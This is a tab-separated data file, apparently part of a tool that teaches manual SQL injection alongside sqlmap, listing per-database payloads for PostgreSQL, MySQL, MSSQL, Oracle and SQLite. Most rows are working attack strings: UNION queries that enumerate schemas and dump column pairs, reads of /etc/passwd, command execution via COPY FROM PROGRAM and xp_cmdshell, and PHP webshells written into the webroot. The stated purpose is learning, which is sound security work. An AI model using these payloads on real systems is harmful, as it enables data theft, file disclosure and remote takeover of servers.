# Per-DBMS manual-SQLi building blocks, used by the sqlmap detector to show the by-hand
# equivalent of each sqlmap step (so you learn manual SQLi instead of only leaning on the tool).
# The detector wraps the read expressions into a UNION payload using the column count and the
# visible ("string") column that sqlmap already found, and prints the stacked-query techniques
# for RCE as-is. Placeholders <DB> <TABLE> <COL1> <COL2> are yours to fill from the earlier steps.
#
# Match is on the DBMS name sqlmap prints ("back-end DBMS: ..."). Columns are TAB separated.
#
# dbms	label	comment	identity	list_dbs	list_tables	list_columns	dump	fileread	rce
dbms	label	comment	identity	list_dbs	list_tables	list_columns	dump	fileread	rce
postgresql	PostgreSQL	-- -	version()	(SELECT string_agg(datname,',') FROM pg_database)	(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')	(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='<TABLE>')	(SELECT string_agg(<COL1>||':'||<COL2>,',') FROM <TABLE>)	(SELECT pg_read_file('/etc/passwd'))	stacked query (superuser): ';CREATE TABLE IF NOT EXISTS sd(o text);COPY sd FROM PROGRAM 'id';-- -  then read it back with UNION: (SELECT string_agg(o,chr(10)) FROM sd) . This is COPY ... FROM PROGRAM (CVE-2019-9193) - exactly what sqlmap --os-shell does here.
mysql	MySQL/MariaDB	-- -	version()	(SELECT group_concat(schema_name) FROM information_schema.schemata)	(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())	(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>')	(SELECT group_concat(<COL1>,0x3a,<COL2>) FROM <TABLE>)	LOAD_FILE('/etc/passwd')	UNION write a webshell (needs FILE priv + writable webroot + empty secure_file_priv): ' UNION SELECT '<?php system($_GET[0]);?>',NULL,... INTO OUTFILE '/var/www/html/sd.php'-- -  then hit /sd.php?0=id
microsoft sql server	Microsoft SQL Server	-- -	@@version	(SELECT STRING_AGG(name,',') FROM master..sysdatabases)	(SELECT STRING_AGG(name,',') FROM <DB>..sysobjects WHERE xtype='U')	(SELECT STRING_AGG(column_name,',') FROM <DB>.information_schema.columns WHERE table_name='<TABLE>')	(SELECT STRING_AGG(CONCAT(<COL1>,':',<COL2>),',') FROM <TABLE>)	(SELECT x FROM OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB) AS y(x))	stacked query (sysadmin): ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';-- -  which is what sqlmap --os-shell automates.
oracle	Oracle	-- -	(SELECT banner FROM v$version WHERE rownum=1)	(SELECT listagg(username,',') WITHIN GROUP (ORDER BY username) FROM all_users)	(SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='<DB>')	(SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='<TABLE>')	(SELECT listagg(<COL1>||':'||<COL2>,',') WITHIN GROUP (ORDER BY <COL1>) FROM <TABLE>)	use sqlmap --file-read; by hand needs a DIRECTORY object + UTL_FILE (advanced)	Oracle RCE is advanced (DBMS_SCHEDULER / Java / PL/SQL); use sqlmap --os-shell and read up on Oracle-specific techniques. Note: Oracle scalar SELECTs need FROM dual and UNION columns must type-match.
sqlite	SQLite	-- -	sqlite_version()	SQLite has a single database (the file itself) - no database list to enumerate.	(SELECT group_concat(name) FROM sqlite_master WHERE type='table')	(SELECT group_concat(name) FROM pragma_table_info('<TABLE>'))	(SELECT group_concat(<COL1>||':'||<COL2>) FROM <TABLE>)	SQLite cannot read arbitrary files through SQL in the normal case.	if the webroot is writable: ATTACH DATABASE '/var/www/html/sd.php' AS a; CREATE TABLE a.p(c text); INSERT INTO a.p VALUES ('<?php system($_GET[0]);?>'); then hit /sd.php?0=id
